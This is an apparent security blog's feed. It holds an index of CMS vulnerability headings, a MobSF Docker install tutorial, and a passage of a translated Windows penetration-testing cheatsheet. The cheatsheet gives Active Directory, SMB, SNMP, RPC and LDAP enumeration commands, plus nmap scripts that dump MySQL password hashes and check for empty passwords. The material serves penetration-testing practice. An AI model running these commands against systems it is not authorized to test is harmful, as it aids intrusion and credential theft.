ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷"></a>10.1 ThinkPHP_3.2.3-5.0.10_缓存函数设计缺陷</h2><h1 id="0x11-ThinkSNS"><a href="#0x11-ThinkSNS" class="headerlink" title="0x11 ThinkSNS"></a>0x11 ThinkSNS</h1><h2 id="11-1-ThinkSNS-V4-后台任意文件下载导致Getshell"><a href="#11-1-ThinkSNS-V4-后台任意文件下载导致Getshell" class="headerlink" title="11.1 ThinkSNS_V4 后台任意文件下载导致Getshell"></a>11.1 ThinkSNS_V4 后台任意文件下载导致Getshell</h2><h1 id="0x12-WebLogic"><a href="#0x12-WebLogic" class="headerlink" title="0x12 WebLogic"></a>0x12 WebLogic</h1><h2 id="12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder"><a href="#12-1-CVE-2017-3506-amp-CVE-2017-10271-XmlDecoder" class="headerlink" title="12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder"></a>12.1 CVE-2017-3506 &amp; CVE-2017-10271 XmlDecoder</h2><h2 id="12-2-CVE-2018-2628-T3-Deserialize"><a href="#12-2-CVE-2018-2628-T3-Deserialize" class="headerlink" title="12.2 CVE-2018-2628 T3 Deserialize"></a>12.2 CVE-2018-2628 T3 Deserialize</h2><h2 id="12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize"><a href="#12-3-CVE-2018-2628-bypassing-CVE-2018-2893-T3-Deserialize" class="headerlink" title="12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize"></a>12.3 CVE-2018-2628 bypassing CVE-2018-2893 T3 Deserialize</h2><h1 id="0x13-WordPress"><a href="#0x13-WordPress" class="headerlink" title="0x13 WordPress"></a>0x13 WordPress</h1><h2 id="13-1-WordPress-4-4-SSRF"><a href="#13-1-WordPress-4-4-SSRF" class="headerlink" title="13.1 WordPress_4.4_SSRF"></a>13.1 WordPress_4.4_SSRF</h2><h2 id="13-2-WordPress-4-7-Info-Disclosure"><a href="#13-2-WordPress-4-7-Info-Disclosure" class="headerlink" title="13.2 WordPress_4.7_Info_Disclosure"></a>13.2 WordPress_4.7_Info_Disclosure</h2><h2 id="13-3-WordPress-4-7-0-4-7-1-未授权内容注入"><a href="#13-3-WordPress-4-7-0-4-7-1-未授权内容注入" class="headerlink" title="13.3 WordPress_4.7.0-4.7.1_未授权内容注入"></a>13.3 WordPress_4.7.0-4.7.1_未授权内容注入</h2><h2 id="13-4-Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#13-4-Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>13.4 Wordpress &lt;= 4.9.6 任意文件删除漏洞</h2><h1 id="0x14-seacms"><a href="#0x14-seacms" class="headerlink" title="0x14 seacms"></a>0x14 seacms</h1><h2 id="14-1-SeaCMS-v6-45前台Getshell-代码执行"><a href="#14-1-SeaCMS-v6-45前台Getshell-代码执行" class="headerlink" title="14.1 SeaCMS v6.45前台Getshell 代码执行"></a>14.1 SeaCMS v6.45前台Getshell 代码执行</h2><h2 id="14-2-seacms6-54代码执行"><a href="#14-2-seacms6-54代码执行" class="headerlink" title="14.2 seacms6.54代码执行"></a>14.2 seacms6.54代码执行</h2><h2 id="14-3-seacms-6-55-代码执行"><a href="#14-3-seacms-6-55-代码执行" class="headerlink" title="14.3 seacms 6.55 代码执行"></a>14.3 seacms 6.55 代码执行</h2><h2 id="14-4-seacms6-61-XSS"><a href="#14-4-seacms6-61-XSS" class="headerlink" title="14.4 seacms6.61 XSS"></a>14.4 seacms6.61 XSS</h2><h2 id="14-5-Seacms6-61后台getshell"><a href="#14-5-Seacms6-61后台getshell" class="headerlink" title="14.5 Seacms6.61后台getshell"></a>14.5 Seacms6.61后台getshell</h2><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7</a>_</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在渗透测试的过程中，会碰到各种CMS搭建的网站，为了积累自己的经验，决定将每种CMS爆出的漏洞整理成文章，这样既方便自己查看，也可以分享给需要的人，大家共同讨论，进步。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞" scheme="https://www.mad-coding.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>使用docker安装移动安全框架（MobSF）</title>
    <link href="https://www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/11/使用docker安装移动安全框架（MobSF）/</id>
    <published>2019-10-11T08:24:31.000Z</published>
    <updated>2019-11-14T08:14:16.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由<a href="https://github.com/MobSF/CapFuzz" target="_blank" rel="noopener">CapFuzz</a>（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。</p><a id="more"></a><h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><blockquote><p>安装环境：</p><p>Kali Linux x64</p><p>Docker</p><p>Python3.6环境</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#使用python3环境</span></span><br><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure><p>选择python3前面的编号</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161228.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载docker，如何之前安装的话</span></span><br><span class="line">apt-get purge docker.io</span><br></pre></td></tr></table></figure><p>下载docker安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://download.docker.com/linux/debian/dists/jessie/pool/stable/amd64/docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161236.png" class="lozad"></p><p>安装docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg  -i docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161252.png" class="lozad"></p><p>启动docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service  docker restart</span><br></pre></td></tr></table></figure><p>docker一键部署framework-mobsf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161327.png" class="lozad"></p><h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p>然后在kali中使用获取浏览器访问：htpp://0.0.0.0:8000</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161335.png" class="lozad"></p><p>或者使用ifconfig命令查看kali的ip地址，然后使用<a href="http://kali的ip地址:8000访问" target="_blank" rel="noopener">http://kali的ip地址:8000访问</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161357.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161412.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果不适用docker一键化部署的话，可能非常的繁琐，所以这里使用了docker进行一键化部署，由于是同事推荐的，然后直接教我怎么部署了，这里也避免走了一些坑，所以大家在部署的过程中还碰到坑的话，就自行百度吧 ^v^.</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/f8a32ef987767296" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由&lt;a href=&quot;https://github.com/MobSF/CapFuzz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CapFuzz&lt;/a&gt;（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="MobSF" scheme="https://www.mad-coding.cn/tags/MobSF/"/>
    
      <category term="移动安全" scheme="https://www.mad-coding.cn/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Windows Notes</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Windows-Notes/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Windows-Notes/</id>
    <published>2019-10-11T07:37:46.000Z</published>
    <updated>2019-11-15T08:27:06.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。</p><p>原文链接：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line">net users /domain</span><br><span class="line">net localgroup</span><br><span class="line">net groups /domain</span><br><span class="line">net groups /domain &quot;Domain Admins&quot;</span><br><span class="line"></span><br><span class="line">Get-ADUser</span><br><span class="line">Get-Domain</span><br><span class="line">Get-DomainUser</span><br><span class="line">Get-DomainGroup</span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Host Discovery</span><br><span class="line">netdiscover -r subnet/24</span><br><span class="line">nbtscan -r [range]</span><br><span class="line">for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Reverse DNS Lookup</span><br><span class="line">$ComputerIPAddress = &quot;10.10.14.14&quot;</span><br><span class="line">[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p><h3 id="1-1-1-具有SPN的用户"><a href="#1-1-1-具有SPN的用户" class="headerlink" title="1.1.1 具有SPN的用户"></a>1.1.1 具有SPN的用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN</span><br><span class="line"></span><br><span class="line">Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span><br><span class="line">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span><br></pre></td></tr></table></figure><h3 id="1-1-2-Kerberos枚举"><a href="#1-1-2-Kerberos枚举" class="headerlink" title="1.1.2 Kerberos枚举"></a>1.1.2 Kerberos枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos;</span><br></pre></td></tr></table></figure><h3 id="1-1-3-红队CSharp脚本"><a href="#1-1-3-红队CSharp脚本" class="headerlink" title="1.1.3 红队CSharp脚本"></a>1.1.3 红队CSharp脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><span class="line"></span><br><span class="line">LDAPUtility.cs</span><br><span class="line"></span><br><span class="line">Usage: ldaputility.exe options domain [arguments]</span><br><span class="line"></span><br><span class="line">ldaputility.exe DumpAllUsers m0chan</span><br><span class="line">ldaputility.exe DumpUser m0chan mr.un1k0d3r</span><br><span class="line">ldaputility.exe DumpUsersEmail m0chan</span><br><span class="line">ldaputility.exe DumpAllComputers m0chan </span><br><span class="line">ldaputility.exe DumpComputer m0chan DC01</span><br><span class="line">ldaputility.exe DumpAllGroups m0chan</span><br><span class="line">ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;</span><br><span class="line">ldaputility.exe DumpPasswordPolicy m0chan</span><br><span class="line"></span><br><span class="line">Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.</span><br><span class="line"></span><br><span class="line">See github linked above for full details.</span><br></pre></td></tr></table></figure><h3 id="1-1-4-活动目录"><a href="#1-1-4-活动目录" class="headerlink" title="1.1.4 活动目录"></a>1.1.4 活动目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:DomainName</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line"># Get Current Domain Info - Similar to Get-Domain</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># Get Domain Trust Info - Similar to Get-DomainTrust</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View Domain Info</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line">#  View Domain Trust Information</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line">nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v</span><br><span class="line"></span><br><span class="line">nltest /dsgetfti:&lt;domain&gt;</span><br><span class="line"></span><br><span class="line">nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View All Domain Controllers</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># View DC for Current Session</span><br><span class="line">nltest /dsgetdc:m0chanAD.local</span><br><span class="line"></span><br><span class="line"># View Domain Trusts from CMD</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># View User Info from CMD</span><br><span class="line">nltest /user:&quot;m0chan&quot;</span><br><span class="line"></span><br><span class="line"># get domain name and DC the user authenticated to</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># Get All Logged on Sessions, Includes NTLM &amp; Kerberos</span><br><span class="line">klist sessions</span><br><span class="line"></span><br><span class="line"># View Kerb Tickets</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># View Cached Krbtgt</span><br><span class="line">klist tgt</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems</span><br><span class="line">set u</span><br><span class="line"></span><br><span class="line">#List all Usernames</span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List Administrators</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List all Info about Specific User</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties</span><br><span class="line"></span><br><span class="line">#View All Users with Description Field Set</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-5-从Linux-Box进行AD枚举-AD工具"><a href="#1-1-5-从Linux-Box进行AD枚举-AD工具" class="headerlink" title="1.1.5 从Linux Box进行AD枚举-AD工具"></a>1.1.5 从Linux Box进行AD枚举-AD工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jasonwbarnett/linux-adtool</span><br><span class="line"></span><br><span class="line">tar zxvf adtools-1.x.tar.gz</span><br><span class="line">cd adtools-1.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">&gt; adtool list ou=user,dc=example,dc=com</span><br><span class="line">CN=allusers,OU=user,DC=example,DC=com</span><br><span class="line">OU=finance,OU=user,DC=example,DC=com</span><br><span class="line">OU=administration,OU=user,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">&gt; adtool oucreate marketing ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool setpass jsmith banana</span><br><span class="line">&gt; adtool unlock jsmith</span><br><span class="line">&gt; adtool groupadd allusers jsmith</span><br><span class="line">&gt; adtool attributereplace jsmith telephonenumber 123</span><br><span class="line">&gt; adtool attributereplace jsmith mail jsmith@example.com</span><br></pre></td></tr></table></figure><h3 id="1-1-6-SharpView枚举"><a href="#1-1-6-SharpView枚举" class="headerlink" title="1.1.6 SharpView枚举"></a>1.1.6 SharpView枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/tevora-threat/SharpView</span><br><span class="line"></span><br><span class="line">Get-DomainFileServer</span><br><span class="line">Get-DomainGPOUserLocalGroupMapping</span><br><span class="line">Find-GPOLocation</span><br><span class="line">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="line">Find-GPOComputerAdmin</span><br><span class="line">Get-DomainObjectAcl</span><br><span class="line">Get-ObjectAcl</span><br><span class="line">Add-DomainObjectAcl</span><br><span class="line">Add-ObjectAcl</span><br><span class="line">Remove-DomainObjectAcl</span><br><span class="line">Get-RegLoggedOn</span><br><span class="line">Get-LoggedOnLocal</span><br><span class="line">Get-NetRDPSession</span><br><span class="line">Test-AdminAccess</span><br><span class="line">Invoke-CheckLocalAdminAccess</span><br><span class="line">Get-WMIProcess</span><br><span class="line">Get-NetProcess</span><br><span class="line">Get-WMIRegProxy</span><br><span class="line">Get-Proxy</span><br><span class="line">Get-WMIRegLastLoggedOn</span><br><span class="line">Get-LastLoggedOn</span><br><span class="line">Get-WMIRegCachedRDPConnection</span><br><span class="line">Get-CachedRDPConnection</span><br><span class="line">Get-WMIRegMountedDrive</span><br><span class="line">Get-RegistryMountedDrive</span><br><span class="line">Find-InterestingDomainAcl</span><br><span class="line">Invoke-ACLScanner</span><br><span class="line">Get-NetShare</span><br><span class="line">Get-NetLoggedon</span><br></pre></td></tr></table></figure><h3 id="1-1-7-SMB枚举"><a href="#1-1-7-SMB枚举" class="headerlink" title="1.1.7 SMB枚举"></a>1.1.7 SMB枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls</span><br><span class="line">enum4linux 1.3.3.7</span><br><span class="line">smbmap -H 1.3.3.7</span><br><span class="line">smbclient -L \\INSERTIPADDRESS</span><br><span class="line">smbclient -L INSERTIPADDRESS</span><br><span class="line">smbclient //INSERTIPADDRESS/tmp</span><br><span class="line">smbclient \\\\INSERTIPADDRESS\\ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/admin$ -U john</span><br><span class="line">nbtscan [SUBNET]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Check for SMB Signing</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-8-SNMP枚举"><a href="#1-1-8-SNMP枚举" class="headerlink" title="1.1.8 SNMP枚举"></a>1.1.8 SNMP枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -c public -v1 10.10.14.14</span><br><span class="line">snmpcheck -t 10.10.14.14 -c public</span><br><span class="line">onesixtyone -c names -i hosts</span><br><span class="line">nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt</span><br><span class="line">snmpenum -t 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-9-MySQL枚举"><a href="#1-1-9-MySQL枚举" class="headerlink" title="1.1.9 MySQL枚举"></a>1.1.9 MySQL枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</span><br></pre></td></tr></table></figure><h3 id="1-1-10-DNS区域转移"><a href="#1-1-10-DNS区域转移" class="headerlink" title="1.1.10 DNS区域转移"></a>1.1.10 DNS区域转移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr blah.com @ns1.m0chan.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d m0chan.com</span><br><span class="line">dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span><br></pre></td></tr></table></figure><h3 id="1-1-11-LDAP"><a href="#1-1-11-LDAP" class="headerlink" title="1.1.11 LDAP"></a>1.1.11 LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://&lt;ip&gt;</span><br><span class="line">ldapwhoami</span><br></pre></td></tr></table></figure><h3 id="1-1-12-RPC枚举"><a href="#1-1-12-RPC枚举" class="headerlink" title="1.1.12 RPC枚举"></a>1.1.12 RPC枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;10.10.14.14&quot;</span><br><span class="line">srvinfo</span><br><span class="line">enumdomusers</span><br><span class="line">enumalsgroups domain</span><br><span class="line">lookupnames administrators</span><br><span class="line">querydominfo</span><br><span class="line">enumdomusers</span><br><span class="line">queryuser &lt;user&gt;</span><br><span class="line">lsaquery</span><br><span class="line">lookupnames Guest</span><br><span class="line">lookupnames Administrator</span><br></pre></td></tr></table></figure><h3 id="1-1-13-远程桌面"><a 